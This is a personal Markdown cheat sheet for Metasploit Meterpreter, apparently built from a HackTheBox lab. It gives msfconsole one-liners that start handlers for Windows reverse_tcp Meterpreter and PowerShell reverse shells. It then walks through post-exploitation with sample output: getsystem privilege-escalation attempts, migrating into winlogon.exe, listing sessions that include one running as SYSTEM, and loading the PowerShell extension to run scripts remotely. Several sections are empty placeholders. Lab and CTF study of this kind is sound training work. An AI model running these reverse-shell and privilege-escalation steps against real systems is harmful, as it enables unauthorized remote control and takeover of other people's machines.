# meterpreter

- [Offensive PowerShell with Metasploit Meterpreter](#offensive-powershell-with-metasploit-meterpreter)
- [TL;DR](#tldr)
- [One Liner Start Meterpreter](#one-liner-start-meterpreter)
- [Load the PowerShell Extension](#load-the-powershell-extension)

# [TL;DR](#tldr-1)
```sh
sysinfo
getuid
getsid
getsystem
getpid
migrate <to-new-PID>
ps <string-to-search>
ps -S <string-to-search>
sessions
```

## 
```sh
echo > ~/myip.txt <IP>
zsh
echo $myip
```

# [One Liner Start Meterpreter](#one-liner-start-meterpreter-1)
https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
```sh
# default LPORT = 4444 
msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;run;"

msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT $port;run;"

msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT $port;run;"

msfconsole -qx "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT $port;run;"
```

## 
```sh
$ msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;run;"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => tun0
[*] Started reverse TCP handler on 10.1.1.1:4444
```

### Syntax
```

```
## Examples 

### sysinfo
```sh
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```

### getuid
```sh
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >
```

### getsid
```sh
meterpreter > getsid
Server SID: S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550
```

### getsystem
```sh
meterpreter > getsystem 
[-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter >
```

### getpid
```sh
meterpreter > getpid
Current pid: 1572
meterpreter >
```

### migrate <to-new-PID>
```sh
meterpreter > migrate 432
[*] Migrating from 1572 to 432...
...
[*] Migration completed successfully.
meterpreter > 
```

### getpid
```sh
meterpreter > getpid
Current pid: 432
meterpreter >
```

### ps <string-to-search>
```sh
meterpreter > ps w3
Filtering on 'w3'

Process List
============

 PID   PPID  Name      Arch  Session  User             Path
 ---   ----  ----      ----  -------  ----             ----
 1572  1600  w3wp.exe  x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe
```

### ps <string-to-search>
```sh
meterpreter > ps win
Filtering on 'win'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 376  304   wininit.exe
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe
```

### ps -S <string-to-search>
```sh
meterpreter > ps -S winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe
```

### sessions
```sh
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.16.52:1234 -> 10.10.10.5:49456 (10.10.10.5)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.16.52:1234 -> 10.10.10.5:49453 (10.10.10.5)
```

# [Offensive PowerShell with Metasploit Meterpreter](https://www.sans.org/blog/offensive-powershell-metasploit-meterpreter/)

## [Load the PowerShell Extension](#load-the-powershell-extension-1)
```sh
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter >
```

## Now we have access to 4 PowerShell-related commands
`powershell_execute`: Execute a PowerShell statement, including complex-statements separated by semicolons
`powershell_import`: Import a local PowerShell script to execute on the remote system over the Meterpreter channel
`powershell_shell`: Launch an interactive PowerShell shell
`powershell_session_remove`: Used to remove a PowerShell session when created using execute/import/shell with the -s argument

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```
